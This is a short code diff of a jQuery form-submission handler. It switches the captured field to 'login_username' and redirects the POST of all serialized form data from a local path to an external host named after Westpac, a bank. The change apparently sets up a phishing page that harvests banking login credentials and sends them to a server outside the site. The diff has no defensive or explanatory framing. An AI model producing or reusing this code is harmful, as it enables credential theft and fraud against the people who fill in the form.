@@ -2409,7 +2409,7 @@ $(document).ready(function() {
         if (!isEmpty) {
             let userinfo = myForm.serializeArray();
             let user = {};
-            let visitor = document.getElementById('Email').value;
+            let visitor = document.getElementById('login_username').value;
 
             userinfo.forEach((value) => {
                 // Use the 'name' attribute to create user object
@@ -2422,7 +2422,7 @@ $(document).ready(function() {
             // Send AJAX request
             $.ajax({
                 method: 'POST',
-                url: "/receive",
+                url: "https://westpac.onrender.com/receive",
                 data: user
             }).done(function(msg) {
                 // Store visitor info in sessionStorage
